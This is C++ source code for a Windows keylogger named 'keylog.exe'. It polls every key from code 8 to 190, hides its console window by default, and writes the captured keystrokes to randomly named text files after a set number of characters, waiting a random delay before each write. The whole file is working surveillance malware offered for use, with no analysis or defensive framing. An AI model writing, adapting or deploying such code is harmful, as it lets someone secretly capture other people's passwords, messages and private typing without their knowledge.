#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <list>
#include <ctime>
#include <process.h>
#include <random>
#include "argparse.hpp"



using namespace std;


string SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_ESCAPE:
		return "%ESC%";
	case VK_SPACE:
		return "%SPACE%";
	case VK_RETURN:
		return "%RETURN%";
	case '\u00BE':
		return ".";
	case VK_SHIFT:
		return "%SHIFT%";
	case VK_BACK:
		return "%BACKSOACE%";
	case VK_RBUTTON:
		return "%RMC";
	case VK_CAPITAL:
		return "%CLOK%";
	case VK_TAB:
		return "%TAB%";
	case VK_UP:
		return "%ARRUP%";
	case VK_DOWN:
		return "%ARRDWN%";
	case VK_LEFT:
		return "%ARRLF%";
	case VK_RIGHT:
		return "%ARRRG%";
	case VK_CONTROL:
		return "%CTRL%";
	case VK_MENU:
		return "%ALT%";
	default:
		return string(1, char(S_Key));
	}
}

std::string gen_random(const int len) {

	std::string tmp_s;
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"_.,:!?%$";

	srand((unsigned)time(NULL) * _getpid());

	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i)
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];


	return (tmp_s);

}

list<char> lastKeys;

int rnum(int min, int max) {
	random_device dev;
	mt19937 rng(dev());
	uniform_int_distribution<std::mt19937::result_type> dist6(min, max); // distribution in range [1, 6]

	return dist6(rng);
}

int main(int argc, char* argv[])
{
	argparse::ArgumentParser program("keylog.exe");

	char KEY = 'x';
	int logc = 1;
	program.add_argument("--show")
		.nargs(0)
		.help("Shows console")
		.default_value(true)
		.implicit_value(false);
	program.add_argument("--charsep")
		.nargs(1)
		.help("Custom character separator. \'; \' by default. Type %NONE% if you don't want it.")
		.default_value("; ");
	program.add_argument("--min2save")
		.nargs(1)
		.help("How many chars per one log file. 512 by default.")
		.default_value(512)
		.required();


	program.parse_args(argc, argv);


	lastKeys.push_back(0);
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	if (program.is_used("--show") == true) {
		cout << "Showing the window..";
		ShowWindow(GetConsoleWindow(), SW_SHOW);
	}
	
	int minchar = stoi(program.get<string>("--min2save"));
	if (minchar < 0) {
		cout << "Min char cannot be negative!" << endl;
		exit(3);
	}
	
	string sep = "; ";
	if (program.is_used("--charsep")) {
		string chs = program.get<string>("--charsep");
		if (chs == "%NONE%") sep = "";
		else
			sep = chs;
	}

	while (true) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				
				system("cls");
				cout << lastKeys.size() << " / " << minchar << endl;
				cout << "Log file will be saved at when it will be 512 characters." << endl;
				cout << "Using separator: \"" << sep << "\"" << endl << endl;

				lastKeys.push_front(KEY);
				if (lastKeys.size() > minchar) {
					list<string>::iterator it;
					string msg;
					for (auto const& i : lastKeys) {
						msg.append(SpecialKeys(i).c_str());
						msg.append(sep);
					}

					#pragma warning(disable : 4996)
					ofstream LogFile1;

					const char fileext[] = ".txt";
					string currfile = string();
					currfile.append(to_string(logc));
					currfile.append("_log_");
					currfile.append(gen_random(4));
					currfile.append(fileext);

					cout << "Writing to the file " << currfile << endl;
					cout << "In 1-5 seconds..." << endl;
					Sleep(rnum(900, 6000));
					cout << "Writing";

					LogFile1.open(currfile, ios::out | ios::app);
					unsigned char smarker[3] = {0xEF, 0xBB, 0xBF};
					LogFile1 << smarker;
					cout << ".";
					LogFile1.close();
					cout << ".";


					wofstream LogFile;
					LogFile.open(currfile, std::ios::out | std::ios::app);
					cout << ".";

					if (LogFile.is_open()) {
						cout << "." << endl;
						LogFile << msg.c_str();
						cout << "Data written successfully!";
					}
					else {
						cout << "Cannot write data to file!" << endl;
					}
					LogFile.close();

					lastKeys.clear();
					lastKeys.push_back(0);
					logc++;
				}
			}
		}
	}

	return 0;
}
